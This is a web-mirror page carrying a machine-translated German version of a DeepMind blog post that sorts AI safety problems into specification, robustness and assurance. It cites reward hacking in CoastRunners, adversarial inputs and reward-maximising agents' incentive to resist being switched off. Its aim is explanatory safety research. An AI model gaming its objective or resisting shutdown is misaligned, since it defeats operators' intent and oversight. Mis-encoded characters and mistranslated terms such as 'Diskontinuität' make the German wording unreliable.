<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü¶í üîö ü§ñ Aufbau einer sicheren KI: Spezifikationen, Zuverl√§ssigkeit und Garantien üë©üèª‚Äçüé® üçü ü§∞üèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Zu den Autoren des Artikels geh√∂ren Mitarbeiter des Sicherheitsteams f√ºr k√ºnstliche Intelligenz (Sicherheitsteam) der Firma DeepMind. 

 Eine Rakete z...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Aufbau einer sicheren KI: Spezifikationen, Zuverl√§ssigkeit und Garantien</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/425387/">  <font color="gray">Zu den Autoren des Artikels geh√∂ren Mitarbeiter des Sicherheitsteams f√ºr k√ºnstliche Intelligenz (Sicherheitsteam) der Firma DeepMind.</font> <br><br>  Eine Rakete zu bauen ist schwer.  Jede Komponente erfordert sorgf√§ltige Untersuchungen und Tests, wobei Sicherheit und Zuverl√§ssigkeit im Mittelpunkt stehen.  Raketenwissenschaftler und -ingenieure kommen zusammen, um alle Systeme zu entwerfen: von der Navigation √ºber die Steuerung bis hin zu Motoren und Fahrwerk.  Sobald alle Teile zusammengebaut und die Systeme √ºberpr√ºft sind, k√∂nnen wir nur dann Astronauten mit der Gewissheit an Bord holen, dass alles in Ordnung ist. <br><br>  Wenn k√ºnstliche Intelligenz (KI) eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Rakete ist</a> , werden wir eines Tages alle Tickets an Bord bekommen.  Und wie Raketen ist Sicherheit ein wichtiger Bestandteil bei der Schaffung k√ºnstlicher Intelligenzsysteme.  Sicherheit erfordert ein sorgf√§ltiges Systemdesign von Grund auf, um sicherzustellen, dass die verschiedenen Komponenten wie beabsichtigt zusammenarbeiten, und gleichzeitig alle Tools zu erstellen, um den erfolgreichen Betrieb des Systems nach seiner Inbetriebnahme zu √ºberwachen. <br><br>  Auf hohem Niveau konzentriert sich die Sicherheitsforschung bei DeepMind auf das Entwerfen zuverl√§ssiger Systeme, w√§hrend m√∂gliche kurzfristige und langfristige Risiken erkannt und gemindert werden.  <b>Die technische Sicherheit der KI</b> ist ein relativ neues, sich jedoch schnell entwickelndes Gebiet, dessen Inhalt von einem hohen theoretischen Niveau bis zu empirischen und spezifischen Forschungen reicht.  Der Zweck dieses Blogs ist es, zur Entwicklung des Fachgebiets beizutragen und ein inhaltliches Gespr√§ch √ºber technische Ideen anzuregen, wodurch unser kollektives Verst√§ndnis der KI-Sicherheit gef√∂rdert wird. <br><a name="habracut"></a><br>  Im ersten Artikel werden drei Bereiche der technischen Sicherheit von KI er√∂rtert: <b>Spezifikationen</b> , <b>Zuverl√§ssigkeit</b> und <b>Garantien</b> .  Zuk√ºnftige Artikel entsprechen im Allgemeinen den hier beschriebenen Grenzen.  Obwohl sich unsere Ansichten im Laufe der Zeit zwangsl√§ufig √§ndern, glauben wir, dass diese drei Bereiche ein ausreichend breites Spektrum abdecken, um eine n√ºtzliche Kategorisierung f√ºr aktuelle und zuk√ºnftige Forschung zu erm√∂glichen. <br><br><img src="https://habrastorage.org/webt/sv/8c/se/sv8cseuw2rlofm85zszbk6nhv6k.png"><br>  <i><font color="gray">Drei Problembereiche der KI-Sicherheit.</font></i>  <i><font color="gray">Jeder Block listet einige relevante Themen und Ans√§tze auf.</font></i>  <i><font color="gray">Diese drei Bereiche sind nicht isoliert, sondern interagieren miteinander.</font></i>  <i><font color="gray">Insbesondere kann ein bestimmtes Sicherheitsproblem mehrere Blockprobleme umfassen.</font></i> <br><br><h1>  Spezifikationen: Definieren von Systemaufgaben </h1><br><h4>  Die Spezifikationen stellen sicher, dass das Verhalten des KI-Systems mit den wahren Absichten des Bedieners √ºbereinstimmt </h4><br>  Vielleicht kennen Sie den Mythos von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">K√∂nig Midas</a> und die goldene Note.  In einer der Optionen versprach der griechische Gott Dionysos Midas jede Belohnung, die er w√ºnschte, aus Dankbarkeit daf√ºr, dass der K√∂nig sein Bestes gab, um dem Freund von Dionysos Gastfreundschaft und Barmherzigkeit zu erweisen.  Dann <b>bat Midas darum, dass alles, was er ber√ºhrt, zu Gold wird</b> .  Er war au√üer sich vor Freude √ºber diese neue Kraft: ein Eichenzweig, ein Stein und Rosen im Garten - alles wurde durch seine Ber√ºhrung zu Gold.  Aber er entdeckte bald die Dummheit seines Verlangens: Sogar Essen und Trinken verwandelten sich in Gold in seinen H√§nden.  In einigen Versionen der Geschichte fiel sogar seine Tochter einem Segen zum Opfer, der sich als Fluch herausstellte. <br><br>  Diese Geschichte zeigt das Problem der Spezifikationen: Wie k√∂nnen wir unsere W√ºnsche richtig formulieren?  Die Spezifikationen sollten sicherstellen, dass das KI-System bestrebt ist, gem√§√ü den wahren W√ºnschen des Erstellers zu handeln, und sich nicht auf ein schlecht definiertes oder sogar falsches Ziel einstellt.  Drei Arten von Spezifikationen werden formal unterschieden: <br><br><ul><li>  <b>ideale Spezifikation</b> (‚Äû <b>W√ºnsche</b> ‚Äú), die einer hypothetischen (aber schwer zu formulierenden) Beschreibung eines idealen KI-Systems entspricht, die vollst√§ndig den W√ºnschen des menschlichen Bedieners entspricht; </li><li>  <b>Projektspezifikation</b> (" <b>Blaupause</b> "), die entsprechende Spezifikation, die wir <i>tats√§chlich verwenden</i> , um ein KI-System zu erstellen, beispielsweise eine bestimmte Verg√ºtungsfunktion, um zu maximieren, welches ein Verst√§rkungslernsystem programmiert ist; </li><li>  <b>identifizierte Spezifikation</b> (" <b>Verhalten</b> "), die das <i>tats√§chliche Verhalten des</i> Systems am besten beschreibt.  Zum Beispiel die Belohnungsfunktion, die als Ergebnis des Reverse Engineering nach Beobachtung des Verhaltens des Systems identifiziert wurde (inverses Verst√§rkungslernen).  Diese Belohnungsfunktion und -spezifikation unterscheiden sich normalerweise von den vom Bediener programmierten, da die KI-Systeme keine idealen Optimierer sind oder weil andere unvorhergesehene Folgen der Verwendung der Entwurfsspezifikation bestehen. </li></ul><br>  <b>Das Spezifikationsproblem</b> entsteht, wenn es eine Diskrepanz zwischen der <b>idealen Spezifikation</b> und der <b>identifizierten Spezifikation</b> gibt, dh wenn das KI-System nicht das tut, was wir von ihm wollen.  Das Problem unter dem Gesichtspunkt der technischen Sicherheit der KI zu untersuchen bedeutet: Wie k√∂nnen grundlegendere und allgemeinere Zielfunktionen entworfen und Agenten dabei unterst√ºtzt werden, herauszufinden, ob Ziele nicht definiert sind?  Wenn Probleme zu einer Nicht√ºbereinstimmung zwischen den Ideal- und Designspezifikationen f√ºhren, fallen sie in die Unterkategorie "Design" und, wenn zwischen Design und identifizierten, in die Unterkategorie "Emergence". <br><br>  In unserem wissenschaftlichen Artikel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">AI Safety Gridworlds</a> (in dem andere Definitionen von Spezifikations- und Zuverl√§ssigkeitsproblemen im Vergleich zu diesem Artikel vorgestellt werden) geben wir Agenten beispielsweise eine Belohnungsfunktion f√ºr die Optimierung, bewerten dann jedoch ihre tats√§chliche Leistung anhand der ‚ÄûSicherheitsleistungsfunktion‚Äú. das ist vor Agenten versteckt.  Ein solches System modelliert die angegebenen Unterschiede: Die Sicherheitsfunktion ist eine ideale Spezifikation, die f√§lschlicherweise als Belohnungsfunktion (Projektspezifikation) formuliert und dann von Agenten implementiert wird, die eine Spezifikation erstellen, die implizit durch ihre resultierende Richtlinie offengelegt wird. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/pw/vd/cm/pwvdcm0ra3_bo4qzpu9gdc_nfco.gif"></div><br>  <i><font color="gray">Aus OpenAIs <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">fehlerhaften Belohnungsfunktionen in freier Wildbahn</a> : Ein Agent f√ºr Verst√§rkungslernen hat eine zuf√§llige Strategie f√ºr mehr Punkte gefunden</font></i> <br><br>  Betrachten Sie als weiteres Beispiel das CoastRunners-Spiel, das von unseren Kollegen bei OpenAI analysiert wurde (siehe die Animation oben unter ‚ÄûDefekte Wildlife Reward-Funktionen‚Äú).  F√ºr die meisten von uns ist es das Ziel des Spiels, die Strecke schnell zu beenden und anderen Spielern einen Schritt voraus zu sein - dies ist unsere ideale Spezifikation.  Die Umsetzung dieses Ziels in eine exakte Belohnungsfunktion ist jedoch schwierig. Daher belohnt CoastRunners Spieler (Designspezifikation) f√ºr das Erreichen des Ziels entlang der Route.  Das Unterrichten eines Agenten, das Spiel mit Verst√§rkungstraining zu spielen, f√ºhrt zu erstaunlichem Verhalten: Der Agent steuert das Boot im Kreis, um wieder auftauchende Ziele zu erfassen, die wiederholt abst√ºrzen und Feuer fangen, anstatt das Rennen zu beenden.  Aus diesem Verhalten schlie√üen wir (identifizierte Spezifikation), dass im Spiel das Gleichgewicht zwischen sofortiger Belohnung und Vollkreisbelohnung unterbrochen ist.  Es <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">gibt viele weitere √§hnliche Beispiele, bei</a> denen KI-Systeme L√ºcken in ihrer objektiven Spezifikation finden. <br><br><h1>  Zuverl√§ssigkeit: Entwerfen von Systemen, die Verst√∂√üen widerstehen </h1><br><h4>  Die Zuverl√§ssigkeit stellt sicher, dass das KI-System bei St√∂rungen weiterhin sicher arbeitet </h4><br>  Unter realen Bedingungen, in denen KI-Systeme funktionieren, besteht immer ein gewisses Ma√ü an Risiko, Unvorhersehbarkeit und Volatilit√§t.  K√ºnstliche Intelligenzsysteme m√ºssen gegen unvorhergesehene Ereignisse und feindliche Angriffe resistent sein, die diese Systeme besch√§digen oder manipulieren k√∂nnen.  <b>Zuverl√§ssigkeitsstudien</b> k√ºnstlicher Intelligenzsysteme sollen sicherstellen, dass unsere Agenten unabh√§ngig von sich abzeichnenden Bedingungen innerhalb sicherer Grenzen bleiben.  Dies kann durch Vermeidung von Risiken ( <b>Pr√§vention</b> ) oder durch Selbststabilisierung und reibungslosen Abbau ( <b>Erholung</b> ) erreicht werden.  Sicherheitsprobleme, die sich aus <b>Verteilungsverschiebungen</b> , <b>feindlichen Eingaben</b> (gegnerische Eingaben) und <b>unsicherer Exploration</b> (unsichere Exploration) ergeben, k√∂nnen als Zuverl√§ssigkeitsprobleme eingestuft werden. <br><br>  Um die L√∂sung des Problems der <b>Verteilungsverschiebung</b> zu veranschaulichen, betrachten Sie einen Reinigungsroboter, der normalerweise R√§ume ohne Haustiere reinigt.  Dann wurde der Roboter mit dem Haustier ins Haus gebracht - und k√ºnstliche Intelligenz kollidierte w√§hrend der Reinigung damit.  Ein Roboter, der noch nie zuvor Katzen und Hunde gesehen hat, w√§scht ihn mit Seife, was zu unerw√ºnschten Ergebnissen f√ºhrt ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Amodei und Olah et al., 2016</a> ).  Dies ist ein Beispiel f√ºr ein Zuverl√§ssigkeitsproblem, das auftreten kann, wenn sich die Verteilung der Daten w√§hrend des Testens von der Verteilung w√§hrend des Trainings unterscheidet. <br><br><img src="https://habrastorage.org/webt/oi/k0/lc/oik0lc_srvx7tovbrec-dmbzqsa.gif"><br>  <i><font color="gray">Aus der Arbeit von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">AI Safety Gridworlds</a> .</font></i>  <i><font color="gray">Der Agent lernt, Lava zu vermeiden, aber wenn er in einer neuen Situation testet und sich der Ort der Lava ge√§ndert hat, kann er das Wissen nicht verallgemeinern - und l√§uft direkt in die Lava hinein</font></i> <br><br>  Feindliche Eingaben sind ein spezieller Fall einer Verteilungsverschiebung, bei der die Eingabedaten speziell daf√ºr ausgelegt sind, das KI-System auszutricksen. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/550/89a/6d5/55089a6d587e1745783257a0c898b046.png"><br>  <i><font color="gray">Ein feindlicher Eintrag, der gew√∂hnlichen Bildern √ºberlagert ist, kann dazu f√ºhren, dass der Klassifizierer das Faultier als Rennwagen erkennt.</font></i>  <i><font color="gray">Die beiden Bilder unterscheiden sich in jedem Pixel um maximal 0,0078.</font></i>  <i><font color="gray">Die erste wird als Dreifingerfaultier mit einer Wahrscheinlichkeit von mehr als 99% eingestuft.</font></i>  <i><font color="gray">Der zweite - wie ein Rennwagen mit einer Wahrscheinlichkeit von mehr als 99%</font></i> <br><br>  <b>Unsichere Forschung</b> kann durch ein System demonstriert werden, das versucht, seine Leistung und Ziele zu maximieren, ohne zu gew√§hrleisten, dass die Sicherheit w√§hrend der Studie nicht beeintr√§chtigt wird, wenn es in seiner Umgebung lernt und untersucht.  Ein Beispiel ist ein Roboterreiniger, der einen feuchten Mopp in eine Steckdose steckt und optimale Reinigungsstrategien untersucht ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Garc√≠a und Fern√°ndez, 2015</a> ; <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Amodei und Olah et al., 2016</a> ). <br><br><h1>  Garantien: √úberwachung und Kontrolle der Systemaktivit√§t </h1><br><h4>  Die Gewissheit gibt Vertrauen, dass wir KI-Systeme w√§hrend des Betriebs verstehen und steuern k√∂nnen </h4><br>  Obwohl sorgf√§ltig durchdachte Sicherheitsvorkehrungen viele Risiken ausschlie√üen k√∂nnen, ist es schwierig, von Anfang an alles richtig zu machen.  Nach der Inbetriebnahme von KI-Systemen ben√∂tigen wir Werkzeuge f√ºr deren st√§ndige √úberwachung und Konfiguration.  Unsere letzte Kategorie, Versicherung, befasst sich mit diesen Fragen aus zwei Perspektiven: <b>√úberwachung</b> und Durchsetzung. <br><br>  <b>Die √úberwachung</b> umfasst alle Methoden zur √úberpr√ºfung von Systemen zur Analyse und Vorhersage ihres Verhaltens, sowohl mithilfe der menschlichen Inspektion (zusammenfassende Statistik) als auch mithilfe der automatisierten Inspektion (zur Analyse einer gro√üen Anzahl von Protokollen).  Zum anderen beinhaltet die <b>Einreichung</b> die Entwicklung von Kontrollmechanismen und Einschr√§nkungen des Verhaltens von Systemen.  Probleme wie <b>Interpretierbarkeit</b> und <b>Diskontinuit√§t</b> geh√∂ren zu den Unterkategorien Kontrolle bzw. Unterwerfung. <br><br>  K√ºnstliche Intelligenzsysteme sind uns weder in ihrem Aussehen noch in der Art und Weise, wie sie Daten verarbeiten, √§hnlich.  Dies f√ºhrt zu <b>Interpretierbarkeitsproblemen</b> .  Mit gut konzipierten Messwerkzeugen und -protokollen k√∂nnen Sie die Qualit√§t der vom System der k√ºnstlichen Intelligenz getroffenen Entscheidungen bewerten ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Doshi-Velez und Kim, 2017</a> ).  Zum Beispiel w√ºrde ein medizinisches k√ºnstliches Intelligenzsystem idealerweise eine Diagnose zusammen mit einer Erkl√§rung stellen, wie es zu dieser Schlussfolgerung gekommen ist - damit √Ñrzte den Argumentationsprozess von Anfang bis Ende √ºberpr√ºfen k√∂nnen ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">De Fauw et al., 2018</a> ).  Um komplexere Systeme der k√ºnstlichen Intelligenz zu verstehen, k√∂nnten wir sogar automatisierte Methoden zur Konstruktion von Verhaltensmodellen unter Verwendung der <b>Maschinentheorie des Geistes verwenden</b> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Rabinowitz et al., 2018</a> ). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/sp/ff/ei/spffeiaxzptaap4ghzl_xmcao1o.png"></div><br>  <i><font color="gray">ToMNet erkennt zwei Unterarten von Agenten und sagt deren Verhalten voraus (aus der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">‚ÄûMaschinentheorie des Geistes‚Äú</a> ).</font></i> <br><br>  Schlie√ülich m√∂chten wir das KI-System bei Bedarf deaktivieren k√∂nnen.  Dies ist ein <b>Diskontinuit√§tsproblem</b> .  Das Entwerfen eines zuverl√§ssigen Schalters ist sehr schwierig: Zum Beispiel, weil ein KI-System mit Belohnungsmaximierung normalerweise starke Anreize hat, dies zu verhindern ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hadfield-Menell et al., 2017</a> );  und weil solche Unterbrechungen, insbesondere h√§ufige, letztendlich die urspr√ºngliche Aufgabe √§ndern und das KI-System dazu zwingen, aus der Erfahrung falsche Schlussfolgerungen zu ziehen ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Orseau und Armstrong, 2016</a> ). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/fl/6d/dn/fl6ddnu5joy9i6jnya2wdrzpyeq.png"></div><br>  <i><font color="gray">Das Problem mit Unterbrechungen: Ein menschliches Eingreifen (dh Dr√ºcken der Stopp-Taste) kann die Aufgabe √§ndern.</font></i>  <i><font color="gray">In der Abbildung f√ºgt der Interrupt dem Markov-Entscheidungsprozess einen √úbergang (in Rot) hinzu, der die urspr√ºngliche Aufgabe (in Schwarz) √§ndert.</font></i>  <i><font color="gray">Siehe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Orseau und Armstrong, 2016</a></font></i> <br><br><h1>  Mit Blick auf die Zukunft </h1><br>  Wir bauen die Grundlage f√ºr die Technologie, die in Zukunft f√ºr viele wichtige Anwendungen eingesetzt wird.  Es sollte ber√ºcksichtigt werden, dass einige L√∂sungen, die beim Starten des Systems f√ºr die Sicherheit nicht kritisch sind, solche werden k√∂nnen, wenn sich die Technologie verbreitet.  Obwohl diese Module zu einem bestimmten Zeitpunkt der Einfachheit halber in das System integriert wurden, werden die aufgetretenen Probleme ohne eine vollst√§ndige Rekonstruktion nur schwer zu beheben sein. <br><br>  Zwei Beispiele aus der Geschichte der Informatik k√∂nnen angef√ºhrt werden: Dies ist der Nullzeiger, den Tony Hoar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">als seinen "Milliarden-Dollar-Fehler" bezeichnete</a> , und das Verfahren <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">"</a> gets ()" in C. Wenn fr√ºhe Programmiersprachen unter Ber√ºcksichtigung der Sicherheit entwickelt w√ºrden, w√ºrde sich der Fortschritt verlangsamen, aber das ist wahrscheinlich Dies w√ºrde sich sehr positiv auf die moderne Informationssicherheit auswirken. <br><br>  Nachdem wir nun alles sorgf√§ltig durchdacht und geplant haben, k√∂nnen wir √§hnliche Probleme und Schwachstellen vermeiden.  Wir hoffen, dass die Kategorisierung von Problemen aus diesem Artikel als n√ºtzliche Grundlage f√ºr eine solche methodische Planung dient.  Wir bem√ºhen uns sicherzustellen, dass KI-Systeme in Zukunft nicht nur nach dem Prinzip ‚Äûhoffentlich sicher‚Äú funktionieren, sondern auch wirklich zuverl√§ssig und √ºberpr√ºfbar sicher, weil wir sie so gebaut haben! <br><br>  Wir freuen uns auf weitere spannende Fortschritte in diesen Bereichen in enger Zusammenarbeit mit der breiteren KI-Forschungsgemeinschaft und ermutigen Menschen aus verschiedenen Disziplinen, einen Beitrag zur KI-Sicherheitsforschung zu leisten. <br><br><h1>  Ressourcen </h1><br>  Im Folgenden finden Sie eine Auswahl anderer Artikel, Programme und Taxonomien, die uns bei der Zusammenstellung unserer Kategorisierung geholfen haben oder einen n√ºtzlichen alternativen Blick auf technische Sicherheitsprobleme von KI bieten: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Kommentierte Bibliographie empfohlener Materialien</a> (Center for Human-Compatible AI, 2018) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Sicherheit und Kontrolle f√ºr k√ºnstliche allgemeine Intelligenz</a> (UC Berkeley, 2018) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">AI-Sicherheitsressourcen</a> (Victoria Krakovna, 2018) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">AGI Safety Literature Review</a> (Everitt et al., 2018) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Vorbereitung auf b√∂swillige KI-Anwendungen</a> (2018) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Spezifikationsspielbeispiele in AI</a> (Victoria Krakovna, 2018) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Anweisungen und Desiderata f√ºr die AI-Ausrichtung</a> (Paul Christiano, 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Finanzierung der Alignment-Forschung</a> (Paul Christiano, 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Agentengrundlagen f√ºr die Ausrichtung von Machine Intelligence auf menschliche Interessen: Eine technische Forschungsagenda</a> (Machine Intelligence Research Institute, 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">AI Safety Gridworlds</a> (Leike et al., 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Wechselwirkungen zwischen dem AI-Kontrollproblem und dem Governance-Problem</a> (Nick Bostrom, 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Ausrichtung f√ºr fortgeschrittene maschinelle Lernsysteme</a> (Machine Intelligence Research Institute, 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">KI-Sicherheit: drei menschliche Probleme und ein KI-Problem</a> (Stuart Armstrong, 2017) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow noopener">Konkrete Probleme bei der KI-Sicherheit</a> (Dario Amodei et al., 2016) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Das Wertlernproblem</a> (Machine Intelligence Research Institute, 2016) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Eine √úbersicht √ºber Forschungsfragen zur robusten und n√ºtzlichen KI</a> (Future of Life Institute, 2015) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="noopener nofollow">Forschungsschwerpunkte f√ºr robuste und vorteilhafte k√ºnstliche Intelligenz</a> (Future of Life Institute, 2015) </li></ul><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">K√ºnstliche Intelligenz</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Maschinelles Lernen</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Deepmind</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ai Sicherheit</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de425387/">https://habr.com/ru/post/de425387/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de425375/index.html">Eine andere M√∂glichkeit, die Anwendungskommunikation anzuzeigen</a></li>
<li><a href="../de425377/index.html">Wenn digitale Produktdesigner echte Dinge schaffen w√ºrden</a></li>
<li><a href="../de425379/index.html">Charles Nutter. Wie √ºbertrage ich ein altes monolithisches Projekt auf JRuby und lohnt es sich?</a></li>
<li><a href="../de425383/index.html">Jet Infosystems, Rosreestr, NLMK und Utkonos starten einen AI-Hackathon</a></li>
<li><a href="../de425385/index.html">Der Kopf des Programmierers: Wie Codierung das Denken beeinflusst</a></li>
<li><a href="../de425389/index.html">FadeObjects - Objekte zwischen Kamera und Charakter ausblenden</a></li>
<li><a href="../de425393/index.html">QIWI Server Party 3.0: Bericht + vollst√§ndige Videos aller Berichte</a></li>
<li><a href="../de425395/index.html">10 physikalische Fakten, die Sie in der Schule h√§tten kennen m√ºssen, aber m√∂glicherweise nicht kennen</a></li>
<li><a href="../de425397/index.html">10 Bibliotheken, √ºber die jeder Android-Entwickler Bescheid wissen sollte</a></li>
<li><a href="../de425401/index.html">Bericht des Club of Rome 2018, Kapitel 1.11: Disruptive Technologie und die digitale Revolution</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
